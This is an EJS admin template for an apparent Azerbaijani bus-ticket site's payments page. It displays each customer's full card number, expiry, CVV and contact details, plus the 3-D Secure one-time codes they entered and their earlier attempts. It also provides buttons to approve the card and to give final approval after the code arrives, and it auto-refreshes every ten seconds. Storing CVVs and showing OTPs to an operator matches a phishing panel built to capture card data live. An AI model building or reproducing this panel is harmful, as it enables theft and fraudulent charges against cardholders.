<section class="section">
  <div class="container">
    <div class="section__head">
      <div>
        <div class="eyebrow"><%= t('nav.panel') %></div>
        <h1><%= t('admin.payments') %></h1>
        <p><%= t('admin.payNote') %></p>
      </div>
    </div>

    <div class="layout-aside">
      <%- include('../../partials/admin-nav') %>

      <div>
        <div class="card mb-24"><div class="card__body">
          <div class="timetable-tabs">
            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending"><%= t('admin.paymentsFilterPending') %></a>
            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved"><%= t('admin.paymentsFilterApproved') %></a>
            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined"><%= t('admin.paymentsFilterDeclined') %></a>
            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all"><%= t('admin.paymentsFilterAll') %></a>
          </div>
          <div id="payNote" class="hidden"></div>
        </div></div>

        <% if (!payments.length) { %>
          <div class="card"><div class="card__body"><p class="sec-note mb-0"><%= t('admin.noPaymentsHere') %></p></div></div>
        <% } %>

        <% payments.forEach(function(p){ %>
          <% var o = orderMap[String(p.order)] || null; %>
          <% var u = userMap[String(p.user)] || null; %>
          <div class="card mb-16">
            <div class="card__head">
              <span class="mono"><%= p.transactionId %></span>
              <span class="badge <%= p.status === 'approved' ? 'badge--green' : (p.status === 'declined' ? 'badge--red' : 'badge--gold') %>"><%= p.status %></span>
            </div>
            <div class="card__body">
              <div class="grid grid--2">
                <div>
                  <h3 style="font-size:1rem;margin-top:0"><%= t('admin.cardData') %></h3>
                  <dl class="kv">
                    <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= p.card && p.card.number ? String(p.card.number).replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim() : '—' %></dd>
                    <dt><%= t('admin.holderLabel') %></dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
                    <dt><%= t('admin.expiryLabel') %></dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
                    <dt><%= t('payment.cvv') %></dt><dd class="mono"><%= p.card && p.card.cvv ? p.card.cvv : '—' %></dd>
                    <dt><%= t('admin.brandLabel') %></dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
                    <dt><%= t('admin.methodLabel') %></dt><dd><%= p.method === 'balance' ? t('admin.methodBalance') : t('admin.methodCard') %></dd>
                    <dt><%= t('payment.amountLabel') %></dt><dd class="mono"><%= p.amount.toFixed(2) %> ₼</dd>
                  </dl>
                </div>
                <div>
                  <h3 style="font-size:1rem;margin-top:0"><%= t('admin.userOrderGroup') %></h3>
                  <dl class="kv">
                    <dt><%= t('account.roleUser') %></dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
                    <dt><%= t('checkout.email') %></dt><dd><%= u ? u.email : '—' %></dd>
                    <dt><%= t('checkout.phone') %></dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
                    <dt><%= t('payment.orderLabel') %></dt><dd class="mono"><%= o ? o.orderNo : 'Balans artırımı' %></dd>
                    <dt><%= t('table.route') %></dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
                    <dt><%= t('search.date') %></dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
                  </dl>
                  <% if (p.submittedCode) { %>
                    <div class="alert alert--success mt-16">
                      <%= t('admin.submittedCodeLabel') %> (3-D):
                      <strong class="mono" style="font-size:1.4rem;letter-spacing:.2em"><%= p.submittedCode %></strong>
                      <% if (p.codeSubmittedAt) { %><br><small><%= new Date(p.codeSubmittedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %></small><% } %>
                    </div>
                    <% if (p.codeAttempts && p.codeAttempts.length > 1) { %>
                      <p class="sec-note">Əvvəlki cəhdlər:
                        <% p.codeAttempts.slice(0, -1).forEach(function(a){ %><span class="mono"><%= a.code %></span> <% }) %>
                      </p>
                    <% } %>
                  <% } else if (p.status === 'awaiting_3ds') { %>
                    <p class="sec-note mt-16">3-D kod hələ daxil edilməyib…</p>
                  <% } %>
                </div>
              </div>

              <% if (p.status === 'pending_admin') { %>
                <div class="flex-end mt-16">
                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>"><%= t('admin.approve') %></button>
                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                </div>
              <% } else if (p.status === 'awaiting_3ds') { %>
                <p class="sec-note mt-16"><%= t('admin.awaiting3dsUser') %></p>
              <% } else if (p.status === 'code_submitted') { %>
                <div class="flex-end mt-16">
                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>"><%= t('admin.approveFinal') %></button>
                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                </div>
              <% } else { %>
                <p class="sec-note mt-16">
                  <%= p.status === 'approved' ? 'Təsdiqlənmiş ödəniş.' : 'Rədd edilmiş ödəniş.' %>
                </p>
              <% } %>
            </div>
          </div>
        <% }) %>
      </div>
    </div>
  </div>
</section>

<script>
(function () {
  var note = document.getElementById('payNote');
  function show(msg, ok) {
    if (!note) { return; }
    note.className = 'alert ' + (ok ? 'alert--info' : 'alert--danger');
    note.textContent = msg;
  }
  async function call(url, body) {
    var res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
      body: JSON.stringify(body || {})
    });
    return res.json();
  }
  document.addEventListener('click', async function (e) {
    var el = e.target.closest('[data-approve-card],[data-approve-final],[data-decline]');
    if (!el) { return; }
    e.preventDefault();
    el.disabled = true;
    var url = '';
    if (el.hasAttribute('data-approve-card')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-card') + '/approve-card'; }
    if (el.hasAttribute('data-approve-final')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-final') + '/approve-final'; }
    if (el.hasAttribute('data-decline')) { url = '/api/admin/payments/' + el.getAttribute('data-decline') + '/decline'; }
    try {
      var data = await call(url, { reason: window.T('admin.rejectReason') });
      show(data.message || (data.ok ? window.T('admin.completed') : window.T('msg.operationFailed')), !!data.ok);
      if (data.ok) { setTimeout(function () { window.location.reload(); }, 900); }
      else { el.disabled = false; }
    } catch (err) {
      show(window.T('msg.networkError'), false);
      el.disabled = false;
    }
  });
  /* Gözləyən tabında yeni ödənişlər avtomatik görünsün */
  if ('<%= status %>' === 'pending') {
    setInterval(function () {
      if (document.querySelector('button:disabled')) { return; }
      window.location.reload();
    }, 10000);
  }
})();
</script>
